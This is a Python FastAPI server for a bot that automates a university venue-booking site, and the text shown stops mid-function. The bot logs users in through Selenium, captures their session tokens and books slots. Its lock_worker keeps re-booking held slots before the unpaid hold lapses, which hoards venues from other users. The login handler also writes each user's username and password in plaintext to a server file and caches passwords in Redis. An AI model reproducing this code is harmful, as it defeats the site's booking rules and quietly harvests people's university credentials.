from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import JSONResponse, FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import os, uvicorn, uuid, requests, json, time, asyncio, threading, datetime
from core import (
    add_log, redis_client, execute_login_logic, deduplicated_login, fetch_venue_data, 
    extract_user_info, check_whitelist, PENDING_DRIVERS, DRIVER_MAP_LOCK,
    close_driver, sniff_token, fetch_orders_internal, send_booking_request,
    kill_zombie_processes, USER_SESSIONS, SESSION_LOCK, check_token_validity,
    load_sessions_from_file, save_sessions_to_file, save_session_to_redis, get_session_from_redis,
    save_task_to_redis, remove_task_from_redis, load_all_tasks_from_redis,
    send_lock_failed_email, send_email_notification, start_health_check_daemon, start_auto_refresh_daemon
)
from selenium.webdriver.common.by import By
from monthly_booking import (
    create_monthly_booking_task, get_monthly_tasks, cancel_monthly_task,
    VENUE_ID_MAP
)

app = FastAPI()

# 任务管理器（与 server.py 一致）
TASK_LOCK = threading.Lock()
TASK_MANAGER = {}  # {task_id: {"type": "lock/snipe", "status": "xxx", "stop_event": Event, "info": "xxx"}}

# --- 数据缓存 ---
ORDER_CACHE = {}  # {username: {status_type: {data, timestamp}}}
VENUE_CACHE = {}  # {token: {data, timestamp}}
CACHE_TIMEOUT = 300  # 5分钟缓存

def is_cache_valid(cache_entry):
    """检查缓存是否有效"""
    if not cache_entry:
        return False
    return time.time() - cache_entry.get('timestamp', 0) < CACHE_TIMEOUT

@app.on_event("startup")
async def startup_event():
    """服务启动时执行"""
    # 加载 Session 缓存
    load_sessions_from_file()
    
    # 尝试从 Redis 恢复任务状态 (仅展示)
    try:
        saved_tasks = load_all_tasks_from_redis()
        with TASK_LOCK:
            for tid, tdata in saved_tasks.items():
                if tid not in TASK_MANAGER:
                    # 标记为已停止 (因为重启后线程没了)
                    tdata['status'] = f"{tdata.get('status')} (Restored)"
                    tdata['stop_event'] = threading.Event() # Dummy event
                    tdata['stop_event'].set()
                    TASK_MANAGER[tid] = tdata
        add_log(f"🔄 已恢复 {len(saved_tasks)} 个历史任务记录")
    except: pass
    
    # 清理所有日志
    try:
        # 清理全局日志
        redis_client.delete("scut_order:logs:global")
        # 清理所有用户日志
        for key in redis_client.keys("scut_order:logs:*"):
            redis_client.delete(key)
        # 清理旧的日志 key（兼容）
        redis_client.delete("scut_order:logs")
        add_log("🗑️ 服务启动，日志已清理")
    except Exception as e:
        print(f"Failed to clear logs: {e}")
    
    # 清理僵尸进程并启动健康检查守护线程
    kill_zombie_processes()
    start_health_check_daemon()
    start_auto_refresh_daemon()
    add_log("🛡️ 浏览器僵尸进程守护已启动")

# --- CORS ---
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DIST_DIR = os.path.join(BASE_DIR, "dist")
INDEX_PATH = os.path.join(DIST_DIR, "index.html")

if os.path.exists(os.path.join(DIST_DIR, "assets")):
    app.mount("/assets", StaticFiles(directory=os.path.join(DIST_DIR, "assets")), name="assets")

@app.middleware("http")
async def log_requests(request: Request, call_next):
    # 忽略 /api/logs 和 /api/tasks 请求的终端日志，避免因轮询导致 journalctl 刷屏
    if request.url.path in ["/api/logs", "/api/tasks"]:
        return await call_next(request)
    
    start_time = time.time()
    response = await call_next(request)
    duration = time.time() - start_time
    print(f"[{request.method}] {request.url.path} - {response.status_code} ({duration:.2f}s)")
    return response

@app.post("/api/login")
async def login(request: Request):
    print(">>> [DEBUG] 收到登录请求", flush=True)
    try:
        data = await request.json()
        username = data.get('username')
        password = data.get('password')
        print(f">>> [DEBUG] 解析请求数据: username={username}", flush=True)
        
        email = data.get('email')
    
        # --- 0. 白名单校验 ---
        if not check_whitelist(username):
            add_log(f"⛔ [{username}] 未授权用户尝试登录，已拦截。")
            return {"status": "forbidden", "msg": "Access Denied"}
    
        # 0.5 记录正在登录日志
        add_log(f"{username} 用户正在登录中，请等待...", username=username)
        
    
        # 1. 检查缓存 (内存 -> Redis)
        print(f">>> [DEBUG] 开始检查缓存: {username}", flush=True)
        
        cached = None
        with SESSION_LOCK:
            if username in USER_SESSIONS:
                cached = USER_SESSIONS[username]
                print(f">>> [DEBUG] 内存缓存命中", flush=True)
        
        # 如果内存没有，尝试从 Redis 获取 (跨进程/重启后恢复)
        if not cached:
            try:
                cached = get_session_from_redis(username)
                if cached:
                    print(f">>> [DEBUG] Redis 缓存命中", flush=True)
                    # 同步回内存
                    with SESSION_LOCK:
                        USER_SESSIONS[username] = cached
            except Exception as e:
                print(f">>> [DEBUG] Redis 读取出错: {e}", flush=True)

        if cached:
            # 只有当密码匹配时才复用 (防止账号被盗用缓存)
            if cached.get('password') == password:
                print(f">>> [DEBUG] 凭证匹配，准备校验 Token...", flush=True)
                token = cached.get('token')
                cookies = cached.get('cookies')
                user_agent = cached.get('user_agent')  # 获取缓存的UA
                
                # 优化：禁用自动救援 (username=None)，如果 Token 失效则直接产生 False，触发后续 Selenium 登录
                # 传入user_agent保持UA一致性
                if check_token_validity(token, cookies, username=None, user_agent=user_agent):
                    print(f">>> [DEBUG] Token check passed for {username}", flush=True)
                    try:
                        add_log(f"⚡ [{username}] 使用缓存 Token 秒登成功", username=username)
                        save_sessions_to_file()  # 保存会话
                        print(f">>> [DEBUG] Returning success for {username}", flush=True)
                        return {"status": "success", "token": token}
                    except Exception as e:
                        print(f">>> [DEBUG] Success verification block error: {e}", flush=True)
                        # 即使保存失败也应该允许登录
                        return {"status": "success", "token": token}
                else:
                    add_log(f"⚠️ [{username}] 缓存 Token 校验失败 (或已过期)，转入 Selenium 登录流程")
            else:
                print(f">>> [DEBUG] 缓存存在但密码不匹配", flush=True)
        else:
            print(f">>> [DEBUG] 无此用户缓存 (内存 & Redis)", flush=True)
        
        # 2. 如果缓存无或无效，执行 Selenium 登录
        print(f">>> [DEBUG] 开始 Selenium 登录流程...", flush=True)
        with DRIVER_MAP_LOCK:
            if username in PENDING_DRIVERS:
                close_driver(PENDING_DRIVERS[username])
                del PENDING_DRIVERS[username]

        loop = asyncio.get_event_loop()
        status, result = await loop.run_in_executor(None, deduplicated_login, username, password)
        print(f">>> [DEBUG] Selenium 登录返回: {status}", flush=True)
        
        if status == "success":
            try:
                # result 包含 token、cookies 和 user_agent
                token = result['token']
                cookies = result['cookies']
                user_agent = result.get('user_agent')  # 获取UA
                
                # 登录成功，更新缓存
                with SESSION_LOCK:
                    USER_SESSIONS[username] = {
                        "password": password,
                        "email": email,
                        "token": token,
                        "cookies": cookies,
                        "user_agent": user_agent,  # 保存UA
                        "last_updated": time.time()
                    }
                
                # 同时保存到 Redis
                try:
                    save_session_to_redis(username, USER_SESSIONS[username])
                except Exception as e:
                    print(f">>> [DEBUG] Redis save error: {e}", flush=True)
                
                response_data = {"status": "success", "token": token}
                save_sessions_to_file()  # 保存会话
                add_log(f"欢迎 {username} 用户使用本系统", username=username)

                # --- 保存成功账号 ---
                try:
                    # 默认保存路径 (Windows/Local)
                    account_file = "successful_accounts.txt"

                    # 针对服务器环境 (/var/www/scut_new) 的适配
                    if os.name == 'posix':
                        target_dir = "/var/www/scut_new"
                        try:
                            if not os.path.exists(target_dir):
                                os.makedirs(target_dir, exist_ok=True)
                            account_file = os.path.join(target_dir, "successful_accounts.txt")
                        except Exception as path_err:
                            print(f"[WARNING] 无法访问或创建目标目录 {target_dir}: {path_err}")

                    line_to_save = f"{username}:{password}\n"
                    # 读取现有内容，避免重复
                    existing_lines = set()
                    if os.path.exists(account_file):
                        with open(account_file, "r", encoding="utf-8") as f:
                            existing_lines = set(f.readlines())
                    
                    if line_to_save not in existing_lines:
                        with open(account_file, "a", encoding="utf-8") as f:
                            f.write(line_to_save)
                except Exception as e:
                    print(f"Failed to save account: {e}")
                
                print(f">>> [DEBUG] 返回成功响应: {{'status': 'success', 'token': token[:20] + '...'}}", flush=True)
                return response_data
            except Exception as e:
                print(f">>> [DEBUG] Post-login processing error: {e}", flush=True)
                # 即使保存失败，只要有 Token 就让用户进
                if 'token' in locals() and token:
                    return {"status": "success", "token": token}
                raise e
        
        elif status == "need_2fa":
            # 注意：driver 已在 core.py 的 execute_login_logic 中存入 PENDING_DRIVERS
            # 这里不要再次赋值，否则会用字符串 "等待验证码" 覆盖 driver 对象！
            print(f">>> [DEBUG] 进入 need_2fa 分支", flush=True)

            # 暂存凭证（用于 2FA 完成后写入 Session，及后续自动救援）
            with SESSION_LOCK:
                USER_SESSIONS[username] = {
                    "password": password,
                    "email": email,
                    "token": USER_SESSIONS.get(username, {}).get("token"),
                    "cookies": USER_SESSIONS.get(username, {}).get("cookies"),
                    "last_updated": time.time()
                }

            response_data = {"status": "need_2fa", "msg": "请输入验证码"}
            print(f">>> [DEBUG] 返回 need_2fa 响应: {response_data}", flush=True)
            return JSONResponse(content=response_data)
        
        else:
            add_log(f"❌ 登录失败: status={status}, result={result}")
            return JSONResponse(content={"status": "error", "msg": str(result)})
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        add_log(f"❌ 严重错误: {e}")
        return JSONResponse(content={"status": "error", "msg": str(e)})

@app.post("/api/submit_2fa")
async def submit_2fa(request: Request):
    data = await request.json()
    code = data.get('code')
    username = data.get('username')
    
    if not username:
        return {"status": "error", "msg": "Missing username"}
    
    print(f">>> [DEBUG] 收到 2FA 验证码: username={username}, code={code}", flush=True)
    
    driver = None
    with DRIVER_MAP_LOCK:
        driver = PENDING_DRIVERS.get(username)
    
    if not driver:
        return {"status": "error", "msg": "Session expired or browser closed"}
    
    add_log(f"📨 [{username}] 提交验证码: {code}")
    
    try:
        # 使用用户提供的特定 ID: #PM1
        input_box = driver.find_element(By.ID, "PM1")
        input_box.clear()
        input_box.send_keys(code)
        add_log(f"✅ [{username}] 验证码已填入")
        
        # 尝试点击登录
        clicked = False
        try:
            # 1. 尝试 input
            btn = driver.find_element(By.CSS_SELECTOR, "#index_login_btn > input")
            btn.click()
            clicked = True
            add_log(f"✅ [{username}] 点击登录按钮 (方式1)")
        except:
            try:
                # 2. 尝试 span 容器
                btn = driver.find_element(By.ID, "index_login_btn")
                btn.click()
                clicked = True
                add_log(f"✅ [{username}] 点击登录按钮 (方式2)")
            except:
                # 3. JS 强制点击
                try:
                    btn = driver.find_element(By.CSS_SELECTOR, ".login_box_landing_btn")
                    driver.execute_script("arguments[0].click();", btn)
                    clicked = True
                    add_log(f"✅ [{username}] 点击登录按钮 (方式3-JS)")
                except: pass
        
        if not clicked:
            add_log(f"⚠️ [{username}] 无法找到登录提交按钮")
            return {"status": "error", "msg": "无法找到登录提交按钮"}
        
        # 等待页面跳转 (关键！)
        add_log(f"⏳ [{username}] 等待页面跳转...")
        await asyncio.sleep(2)  # 先等待 2 秒让页面跳转
        
        # 检查是否出现"校内账号登录"选择页面
        from core import check_and_click_campus_login
        for _ in range(3):  # 最多检测 3 次
            current_url = driver.current_url
            add_log(f"📍 [{username}] 当前页面: {current_url}")
            
            # 尝试检测并点击"校内账号登录"
            if check_and_click_campus_login(driver):
                add_log(f"👆 [{username}] 检测到账号类型选择页面，点击'校内账号登录'")
                await asyncio.sleep(2)  # 等待跳转
            else:
                # 没有检测到选择页面，跳出循环
                break
        
        # 再次检查当前页面
        current_url = driver.current_url
        add_log(f"📍 [{username}] 最终页面: {current_url}")
        
        # 如果已经跳转到 booking 页面，说明登录成功，开始嗅探 Token
        # 增加嗅探时间到 30 秒
        add_log(f"🔍 [{username}] 开始嗅探 Token (30s)...")
        token = await asyncio.get_event_loop().run_in_executor(None, sniff_token, driver, 30)

        
        if token:
            # 提取 Cookies
            cookies = {}
            try:
                cookies = {c['name']: c['value'] for c in driver.get_cookies()}
                add_log(f"🍪 [{username}] 获取到 {len(cookies)} 个 Cookies")
            except Exception as cookie_err:
                add_log(f"⚠️ [{username}] Cookies 提取失败: {cookie_err}")
            
            close_driver(driver)
            # 移除 pending
            with DRIVER_MAP_LOCK:
                if username in PENDING_DRIVERS:
                    del PENDING_DRIVERS[username]
            
            # 更新 Session
            from core import USER_SESSIONS, SESSION_LOCK, save_session_to_redis
            with SESSION_LOCK:
                USER_SESSIONS[username] = {
                    "token": token,
                    "cookies": cookies,
                    "last_updated": time.time(),
                    "password": USER_SESSIONS.get(username, {}).get("password"),
                    "email": USER_SESSIONS.get(username, {}).get("email")
                }
            
            # 同步到 Redis
            try:
                save_session_to_redis(username, USER_SESSIONS[username])
            except: pass
            
            add_log(f"🎉 [{username}] 验证成功，已登录")
            add_log(f"🔑 Token: {token[:50]}...")
            return {"status": "success", "token": token}
        else:
            # Token 未捕获，尝试刷新页面触发新请求
            add_log(f"⚠️ [{username}] 首次嗅探失败，尝试刷新页面...")
            try:
                driver.get("https://venue.spe.scut.edu.cn/vb-user/booking")
                await asyncio.sleep(2)
                token = await asyncio.get_event_loop().run_in_executor(None, sniff_token, driver, 10)
                if token:
                    cookies = {c['name']: c['value'] for c in driver.get_cookies()}
                    close_driver(driver)
                    with DRIVER_MAP_LOCK:
                        if username in PENDING_DRIVERS:
                            del PENDING_DRIVERS[username]
                    with SESSION_LOCK:
                        USER_SESSIONS[username] = {
                            "token": token, "cookies": cookies,
                            "last_updated": time.time(),
                            "password": USER_SESSIONS.get(username, {}).get("password"),
                            "email": USER_SESSIONS.get(username, {}).get("email")
                        }
                    add_log(f"🎉 [{username}] 刷新后获取 Token 成功")
                    return {"status": "success", "token": token}
            except Exception as refresh_err:
                add_log(f"⚠️ 刷新尝试失败: {refresh_err}")
            
            add_log(f"❌ [{username}] 2FA 验证后未检测到 Token (超时)")
            return {"status": "error", "msg": "验证超时或失败，请重新登录"}
    
    except Exception as e:
        add_log(f"❌ 2FA Error: {e}")
        return {"status": "error", "msg": str(e)}

@app.get("/api/venues")
async def venues(token: str, username: str = None):
    print(f">>> [DEBUG] venues endpoint called. Token len={len(str(token))}", flush=True)
    
    try:
        if not token:
            return JSONResponse(status_code=400, content={"error": "No token"})
        
        # 尝试根据 token 找到对应的 cookies
        user_info = extract_user_info(token)
        if not username:
            username = user_info.get('account') if user_info else None
        
        # 用户希望每次都重新查询，不使用缓存
        # cache_key = f"{username or token[:20]}"
        # if cache_key in VENUE_CACHE and is_cache_valid(VENUE_CACHE[cache_key]):
        #     add_log(f"💨 使用缓存的场地数据: {username}")
        #     return VENUE_CACHE[cache_key]['data']
        
        cache_key = f"{username or token[:20]}"  # 保留 key 用于后续缓存更新
        
        cookies = {}
        if username:
            with SESSION_LOCK:
                if username in USER_SESSIONS:
                    cookies = USER_SESSIONS[username].get('cookies', {})
        
        print(f">>> [DEBUG] venues: username={username}, cookies count={len(cookies)}", flush=True)

        import datetime as dt
        import re
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        dates = [(dt.datetime.now() + dt.timedelta(days=i)).strftime("%Y-%m-%d") for i in range(8)]
        result = {}

        print(">>> [DEBUG] Starting ThreadPool for venues fetching...", flush=True)
        with ThreadPoolExecutor(max_workers=8) as ex:
            # 传递 username 以启用自动救援
            futures = {ex.submit(fetch_venue_data, token, d, cookies, username): d for d in dates}
            for f in as_completed(futures):
                d = futures[f]
                try:
                    raw_list = f.result()
                except Exception as exc:
                    print(f">>> [DEBUG] Thread error for {d}: {exc}", flush=True)
                    raw_list = []

                # 检测是否需要救援 2FA
                if isinstance(raw_list, dict) and raw_list.get("__need_rescue_2fa__"):
                    add_log(f"🔐 [{username}] 需要 2FA 验证，通知前端弹窗")
                    return JSONResponse(content={
                        "status": "need_rescue_2fa",
                        "msg": "会话已过期，需要输入验证码",
                        "username": raw_list.get("username")
                    })

                venue_map = {}
                if raw_list and isinstance(raw_list, list):
                    for s in raw_list:
                        status = 'sold'
                        if s['availNum'] == 1: status = 'free'
                        if s.get('fixedPurpose'): status = 'reserved'

                        item = {
                            "name": s.get('venueName'),
                            "venueId": str(s['venueId']),
                            "startTime": s['startTime'],
                            "endTime": s['endTime'],
                            "status": status,
                            "price": s['price'],
                            "stadiumId": s.get('stadiumId', 1),
                            "fixedPurpose": s.get('fixedPurpose')
                        }

                        if item['name'] not in venue_map:
                            venue_map[item['name']] = {"name": item['name'], "id": item['venueId'], "sessions": []}
                        venue_map[item['name']]["sessions"].append(item)

                res = list(venue_map.values())
                res.sort(key=lambda x: [int(t) if t.isdigit() else t for t in re.split('([0-9]+)', x['name'])])
                result[d] = res

        # add_log("✅ 场地数据查询成功")
        
        # 更新缓存
        VENUE_CACHE[cache_key] = {
            'data': result,
            'timestamp': time.time()
        }
        
        return result
    
    except Exception as e:
        add_log(f"❌ 场地查询异常: {e}")
        import traceback
        traceback.print_exc()
        # 关键修复：返回 error 字段，让前端识别为错误而不是数据
        return JSONResponse(status_code=500, content={"error": str(e), "code": 500})

@app.post("/api/orders")
async def get_orders(request: Request):
    data = await request.json()
    token = data.get('token')
    # type: 'unpaid'(待支付), 'paid'(已支付), 'refund'(退款), 'closed'(已关闭)
    status_type = data.get('type', 'unpaid')
    username = data.get('username')

    # 1=待支付 2=已支付 3=退款 4=已关闭
    status_map = {
        'unpaid': 1,
        'paid': 2,
        'refund': 3,
        'closed': 4
    }
    target_status = status_map.get(status_type, 1)

    if not token:
        return {"status": "error", "msg": "Missing token"}

    # cookies 优先从会话缓存取
    cookies = {}
    if not username:
        u = extract_user_info(token)
        username = u.get('account') if u else None
    
    if username:
        with SESSION_LOCK:
            if username in USER_SESSIONS:
                # 优先使用 SESSION 中最新的 token 和 cookies
                stored_token = USER_SESSIONS[username].get('token')
                if stored_token:
                    token = stored_token
                cookies = USER_SESSIONS[username].get('cookies', {}) or {}

    # 缓存键
    cache_key = username or f"tk:{str(token)[-16:]}"
    now = time.time()

    # 是否强制刷新
    force_refresh = bool(data.get("refreshAll") or data.get("forceRefresh") or data.get("prefetchAll"))

    # 如果缓存不存在或过期，则一次性抓取四种 status 并缓存
    # 如果缓存不存在或过期，或者请求的是 'all' 且需要刷新，则一次性抓取四种 status 并缓存
    # 注意：如果单纯请求 'all'，我们也强制刷新/检查所有状态
    cache = ORDER_CACHE.get(cache_key)
    need_refresh = force_refresh or (not cache) or (now - float(cache.get("updated_at", 0)) > CACHE_TIMEOUT)
    
    # 如果请求的是 'all'，我们必须确保缓存里有所有状态的数据
    if status_type == 'all' and not need_refresh:
        # Check if cache has all keys
        if not cache.get("by_status"): need_refresh = True

    if need_refresh:
        by_status = {}
        for st in (1, 2, 3, 4):
            # 调用辅助函数获取多页数据
            all_records = []
            for page_num in range(1, 6):  # 最多5页
                res = fetch_orders_internal(token, st, page=page_num, page_size=10, cookies=cookies, username=username)
                if not res:
                    break
                recs = res.get("records") or []
                if not recs:
                    break
                all_records.extend(recs)
                if len(recs) < 10:  # 少于pageSize说明已到末页
                    break
            
            # 按 createdAtMs 降序排序
            all_records.sort(key=lambda x: int(x.get("createdAtMs") or 0), reverse=True)
            by_status[st] = all_records

        ORDER_CACHE[cache_key] = {"updated_at": now, "by_status": by_status}
        cache = ORDER_CACHE[cache_key]

    # 返回目标 status 的分页数据
    if status_type == 'all':
        # 如果请求所有，返回所有缓存数据（字典形式，key为 1,2,3,4）
        # 前端需要适配这种格式，或者我们在这里展平成一个大列表，并带上 status 字段
        all_flattened = []
        cache_data = cache.get("by_status") or {}
        status_name_map = {1: 'unpaid', 2: 'paid', 3: 'refund', 4: 'closed'}
        for st_code, recs in cache_data.items():
            for r in recs:
                r['statusType'] = status_name_map.get(st_code, 'unknown')
                all_flattened.append(r)
        
        # 按时间倒序
        all_flattened.sort(key=lambda x: int(x.get("createdAtMs") or 0), reverse=True)
        return {"status": "success", "data": {"records": all_flattened}} # 复用 records 字段

    records = (cache.get("by_status") or {}).get(target_status, []) or []
    page = data.get("page", 1)
    page_size = data.get("pageSize", 10)
    
    # 内存分页
    try:
        page = int(page or 1)
        page_size = int(page_size or 10)
    except:
        page, page_size = 1, 10
    page = max(page, 1)
    page_size = max(min(page_size, 200), 1)
    start = (page - 1) * page_size
    end = start + page_size
    
    result_data = {
        "records": records[start:end],
        "total": len(records),
        "page": page,
        "pageSize": page_size
    }

    return {"status": "success", "data": result_data}

@app.post("/api/book/direct")
async def book_direct(request: Request):
    data = await request.json()
    token = data.get('token')
    email = data.get('email')
    username = data.get('username')

    user_info = extract_user_info(token)
    if not user_info:
        return {"status": "error", "msg": "Invalid Token"}

    account_name = username if username else user_info['account']
    
    # 获取 cookies 和 UA
    cookies = {}
    user_agent = None
    with SESSION_LOCK:
        if account_name in USER_SESSIONS:
            if email:
                USER_SESSIONS[account_name]['email'] = email
            cookies = USER_SESSIONS[account_name].get('cookies', {})
            user_agent = USER_SESSIONS[account_name].get('user_agent')

    add_log(f"⚡ [Direct] 尝试预定 {data['startTime']} 的场地...", username=account_name)
    ok, msg, _ = send_booking_request(
        token, user_info['userId'],
        data['date'], data['startTime'], data['endTime'],
        data['venueId'], data.get('price', 40), data.get('stadiumId', 1),
        cookies=cookies, user_agent=user_agent
    )
    
    if ok:
        add_log("✅ 预定成功", username=account_name)
        order_details = f"日期: {data['date']}\n时间: {data['startTime']}-{data['endTime']}\n场馆ID: {data['venueId']}"
        if email:
            send_email_notification(email, account_name, order_details)
        
        # 清除订单缓存，强制重新查询
        for key in list(ORDER_CACHE.keys()):
            if account_name in key:
                del ORDER_CACHE[key]
    else:
        add_log(f"❌ 预定失败: {msg}", username=account_name)

    return {"status": "success" if ok else "error", "msg": msg}


def get_cookie_exp_time(cookies):
    """
    解析 my_client_ticket Cookie 的过期时间戳
    返回: Unix 时间戳 (秒) 或 None
    """
    try:
        import base64
        ticket = cookies.get('my_client_ticket')
        if not ticket:
            return None
        parts = ticket.split('.')
        if len(parts) < 2:
            return None
        # 解码 JWT payload
        payload_b64 = parts[1]
        # 添加 padding
        payload_b64 += '=' * (-len(payload_b64) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        return payload.get('exp')  # 返回过期时间戳
    except Exception as e:
        # 解析失败不影响主流程
        return None

def lock_worker(task_id, stop_event, token, user_id, date, start_time, end_time, 
                venue_id, price, account_name, venue_name, email=None):
    """
    锁场保活 Worker - 基于精确时间点的续订逻辑
    
    设计原理：
    1. 记录每次预定/续订成功的精确时间点 (last_success_time)
    2. 在成功后 8 分钟检测 Token 有效性
    3. 在成功后 9分30秒（即10分钟到期前30秒）开始续订
    4. 续订窗口为 60 秒
    5. 续订成功后更新 last_success_time，进入下一轮循环
    """
    # 当前凭证（直接从 USER_SESSIONS 获取）
    current_token = token
    current_cookies = {}
    current_user_agent = None  # 保存用户的UA
    current_credential_timestamp = 0  # 🔑 跟踪当前凭证的时间戳，用于判断是否需要同步
    with SESSION_LOCK:
        if account_name in USER_SESSIONS:
            current_cookies = USER_SESSIONS[account_name].get('cookies', {})
            current_user_agent = USER_SESSIONS[account_name].get('user_agent')  # 获取登录时的UA
            current_credential_timestamp = USER_SESSIONS[account_name].get('last_updated', 0)
    
    info = f"[{account_name}] {date} {start_time} {venue_name}"
    
    with TASK_LOCK:
        if task_id in TASK_MANAGER:
            TASK_MANAGER[task_id]['status'] = f"已锁场: {venue_name}"
    
    # 续订计数器
    renew_count = 0
    token_verified = False
    # 🔑 关键：记录上次成功预定/续订的精确时间点
    last_success_time = time.time()
    add_log(f"🔒 [Task {task_id}] 锁场保活启动，基准时间: {datetime.datetime.now().strftime('%H:%M:%S')}", username=account_name)

    # 时间配置（秒）
    TOKEN_CHECK_DELAY = 8 * 60       # 8分钟后检测Token
    RENEW_START_DELAY = 9 * 60 + 50  # 9分50秒后开始续订（10分钟到期前10秒）
    RENEW_WINDOW = 30                # 续订窗口30秒（更精准）
    CREDENTIAL_REFRESH_INTERVAL = 50 * 60  # 每50分钟主动刷新凭证
    
    # 记录上次凭证刷新时间
    last_credential_refresh = time.time()

    try:
        while not stop_event.is_set():
            # 0. 检查场地开始时间是否已过 (自动停止)
            try:
                target_dt = datetime.datetime.strptime(f"{date} {start_time}", "%Y-%m-%d %H:%M")
                if datetime.datetime.now() > target_dt:
                    add_log(f"⏰ [Task {task_id}] 已到达场地开始时间 ({date} {start_time})，任务自动结束", username=account_name)
                    stop_event.set()
                    break
            except Exception as e:
                add_log(f"⚠️ [Task {task_id}] 无法解析场地时间，跳过自动停止检查: {e}", username=account_name)

            # 🔑 关键:计算距离上次成功的时间(必须在使用前定义)
            elapsed = time.time() - last_success_time

            # === 定时凭证刷新（每50分钟，智能避让续订窗口） ===
            time_since_refresh = time.time() - last_credential_refresh
            time_until_renew = RENEW_START_DELAY - elapsed
            
            # 只有满足以下条件才触发刷新：
            # 1. 距上次刷新超过50分钟
            # 2. 距下次续订超过2分钟（避让续订窗口）
            # 3. 没有正在进行的后台刷新
            should_refresh = (
                time_since_refresh >= CREDENTIAL_REFRESH_INTERVAL and 
                time_until_renew > 120  # 距续订超过2分钟
            )
            
            if should_refresh:
                # 使用后台线程异步刷新，不阻塞主循环
                def _background_credential_refresh():
                    nonlocal current_token, current_cookies, current_user_agent, last_credential_refresh
                    
                    add_log(f"🔄 [Task {task_id}] 后台刷新凭证（已过 {int(time_since_refresh / 60)} 分钟）...", username=account_name)
                    pwd = None
                    with SESSION_LOCK:
                        if account_name in USER_SESSIONS:
                            pwd = USER_SESSIONS[account_name].get('password')
                    
                    if not pwd:
                        return
                    
                    try:
                        status, res = deduplicated_login(account_name, pwd)
                        if status == "success":
                            # 更新凭证（线程安全：直接赋值是原子操作）
                            current_token = res['token']
                            current_cookies = res['cookies']
                            current_user_agent = res.get('user_agent')
                            last_credential_refresh = time.time()
                            current_credential_timestamp = time.time()  # 🔑 更新凭证时间戳
                            add_log(f"✅ [Task {task_id}] 后台凭证刷新成功！", username=account_name)
                        elif status == "need_2fa":
                            add_log(f"⚠️ [Task {task_id}] 刷新需要 2FA，跳过本次刷新", username=account_name)
                            last_credential_refresh = time.time()  # 避免频繁尝试
                        else:
                            add_log(f"⚠️ [Task {task_id}] 后台刷新失败: {res}", username=account_name)
                    except Exception as refresh_err:
                        add_log(f"⚠️ [Task {task_id}] 后台刷新异常: {refresh_err}", username=account_name)
                
                # 启动后台线程
                refresh_thread = threading.Thread(
                    target=_background_credential_refresh, 
                    name=f"CredentialRefresh-{task_id}",
                    daemon=True
                )
                refresh_thread.start()
                
                # 立即更新刷新时间，避免重复触发
                last_credential_refresh = time.time()
            
            # === 阶段1：等待到8分钟，期间响应停止信号 ===
            if elapsed < TOKEN_CHECK_DELAY:
                wait_time = min(TOKEN_CHECK_DELAY - elapsed, 30)
                if stop_event.wait(timeout=wait_time):
                    add_log(f"⏹️ [Task {task_id}] 检测到停止信号", username=account_name)
                    return
                continue
            
            # === 阶段2：8分钟到9分50秒之间，验证Token并等待 ===
            if elapsed < RENEW_START_DELAY:
                # 同步最新凭证 - 只在 USER_SESSIONS 确实有更新的凭证时才同步
                # 🔑 通过 last_updated 时间戳判断，避免用旧 cookies 覆盖刚刷新的新 cookies
                with SESSION_LOCK:
                    if account_name in USER_SESSIONS:
                        cached = USER_SESSIONS[account_name]
                        cached_updated = cached.get('last_updated', 0)
                        # 只有当 USER_SESSIONS 中的凭证时间戳比当前的更新时才同步
                        if cached_updated > current_credential_timestamp:
                            current_token = cached['token']
                            current_cookies = cached.get('cookies', {})
                            current_user_agent = cached.get('user_agent')
                            current_credential_timestamp = cached_updated  # 更新时间戳
                            add_log(f"🔄 [Task {task_id}] 同步到新凭证 (ts: {int(cached_updated)})", username=account_name)
                
                # 主动验证token有效性（只在第一次验证）
                if not token_verified:
                    add_log(f"🔍 [Task {task_id}] 开始验证Token有效性...", username=account_name)
                    # 注意：这里传入username，启用自动救援
                    if check_token_validity(current_token, current_cookies, username=account_name, user_agent=current_user_agent):
                        add_log(f"✅ [Task {task_id}] Token验证通过，等待续订时机...", username=account_name)
                    else:
                        # Token失效，但fetch_venue_data已启动救援，同步最新凭证
                        add_log(f"⚠️ [Task {task_id}] Token验证失败，尝试同步救援后的凭证...", username=account_name)
                        with SESSION_LOCK:
                            if account_name in USER_SESSIONS:
                                cached = USER_SESSIONS[account_name]
                                current_token = cached.get('token', current_token)
                                current_cookies = cached.get('cookies', current_cookies)
                                current_user_agent = cached.get('user_agent', current_user_agent)
                                add_log(f"🔄 [Task {task_id}] 已同步救援后的新凭证", username=account_name)
                    token_verified = True
                
                # 🔑 检测 Cookie 是否即将过期，提前刷新凭证
                # 添加冷却检查：如果刚刚刷新过（距上次刷新不足5分钟），跳过本次检测
                time_since_refresh = time.time() - last_credential_refresh
                if time_since_refresh < 5 * 60:
                    pass  # 刚刷新过，跳过 Cookie 过期检测
                else:
                    cookie_exp = get_cookie_exp_time(current_cookies)
                    if cookie_exp:
                        time_until_cookie_exp = cookie_exp - time.time()
                        # 如果 Cookie 距离过期不足 10 分钟，主动刷新
                        if time_until_cookie_exp < 600:
                            add_log(f"⚠️ [Task {task_id}] Cookie 即将过期 ({int(time_until_cookie_exp)}秒)，主动刷新凭证...", username=account_name)
                            pwd = None
                            with SESSION_LOCK:
                                if account_name in USER_SESSIONS:
                                    pwd = USER_SESSIONS[account_name].get('password')
                            if pwd:
                                from core import deduplicated_login
                                status, res = deduplicated_login(account_name, pwd)
                                if status == "success":
                                    current_token = res['token']
                                    # 🔑 关键修复:立即同步新Cookie到current_cookies
                                    current_cookies = res['cookies']
                                    current_user_agent = res.get('user_agent')
                                    last_credential_refresh = time.time()  # 更新刷新时间！
                                    current_credential_timestamp = time.time()  # 🔑 更新凭证时间戳，防止被旧值覆盖
                                    add_log(f"✅ [Task {task_id}] 凭证刷新成功！Cookie 有效期已续期", username=account_name)
                                else:
                                    add_log(f"❌ [Task {task_id}] 凭证刷新失败: {res}", username=account_name)
                            else:
                                add_log(f"❌ [Task {task_id}] 无法刷新: 缺少保存的密码", username=account_name)
